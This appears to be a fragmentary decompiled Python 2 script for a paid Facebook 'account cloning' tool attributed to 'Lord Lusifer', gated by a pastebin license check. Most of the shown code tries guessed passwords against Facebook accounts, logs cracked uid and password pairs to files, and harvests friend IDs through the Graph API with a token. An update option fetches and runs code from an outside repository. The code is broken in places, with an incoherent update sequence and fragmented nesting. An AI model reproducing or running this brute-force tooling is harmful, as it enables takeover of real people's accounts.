# Decompile by Mardis (Tools By Lord Lusifer)
# Time Succes decompile : 2022-04-01 09:45:13.779936
...
\033[1;31m______________________________________________________

 [*] DEVELOPER : Lord Lusifer
 [*] TOOLS     : PAID
 [*] Telegram  : l0rd_lusifer
\033[1;32m_____________________________________________________
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/.lusifer.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        print ("press inter To Buy This tooL")
        print ("")
        myid=uuid.uuid4().hex[:10]
        print ("         YOUR KEY : "+myid+imt)
        kok=open("/sdcard/.lusifer.txt",'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("press inter To Buy This tooL")
        raw_input ("press inter To Buy This tooL")
        os.system("xdg-open https://t.me/l0rd_lusifer")
        
    r1=requests.get("https://pastebin.com/diaZTw2h").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_system():
    ...
    print ""
    print 39*'~'
    print "\x1b[1;32m[1]   Public Cloning      \x1b[1;31m[Login Needed]"
    print "\x1b[1;32m[2]   Random Cloning     \x1b[1;31m [Without Login]"
    print "\x1b[1;32m[3]   File Cloning       \x1b[1;31m [Without Login]"
    print "\x1b[1;32m[4]   File Making Menu\x1b[1;31m   [Login Needed]"
    print "\x1b[1;32m[5]   Check Subscription "
    print "\x1b[1;32m[6]   Update Tools"
    print "\x1b[1;32m[7]   For Any Help Massage Me On Telegram"
    print 43*'~'
    print "\x1b[1;33m[*]\x1b[1;33m For Need Any Help Type 7 And \x1b[1;33mDM Me  "
    print 43*'~'
    main_input()
def main_input():
    mx=raw_input('\x1b[1;32m[*] Select :\x1b[1;32m ')
    if mx=='1':
        print ""
        ...
        print ("\x1b[1;92m        Member In Lord Lusifer Paid Commands ")
        print ("\x1b[1;91m        ENJOY  Bro ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/LordLusifer0/Lusifer-V1")
        os.system("rm -rf Lusifer-V1")
        os.system("cp -f Lusifer-V1/Lusifer-V1 \\.")
        os.system("rm -rf Lusifer-V1")
        os.system(" cd Lusifer-V1")
        os.system(" python2 Lusif3r-v1.py")
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[LORD-LUSIFER-OK] "+coc+user + " | " + pass1
                ok=open('LUSIF3R random-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[LORD-LUSIFER-CP] "+coc+user + " | " + pass1
                    cp=open('LUSIF3R random-cp.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    print g+"[=] Extracting From LUSIFER : "+my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[LORD-LUSIFER-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[LORD-LUSIFER-CP] "+uid + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[LORD-LUSIFER-OK] "+uid + " | " + pass2
                        ok=open('YOUSAF-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[LORD-LUSIFER-CP] "+uid + " | " + pass2
                            cp=open('LUSIF3R-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[LORD-LUSIFER-OK] "+uid + " | " + pass3
                                ok=open('LUSIF3R-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[LORD-LUSIFER-CP] "+uid + " | " + pass3
                                    cp=open('LUSIF3R-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[LORD-LUSIFER-OK] "+uid + " | " + pass4
                                        ok=open('LUSIF3R-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[LORD-LUSIFER-CP] "+uid + " | " + pass4
                                            cp=open('LUSIF3R-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[LORD-LUSIFER-OK] "+uid + " | " + pass5
                                                ok=open('LUSIF3R-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[LORD-LUSIFER-CP] "+uid + " | " + pass5
                                                    cp=open('LUSIF3R-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From LUSIF3R : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[LORD-LUSIFER-OK] "+uid + " | " + pass6
                                                        ok=open('LUSIF3R-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[LORD-LUSIFER-CP] "+uid + " | " + pass6
                                                            cp=open('LUSIF3R-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
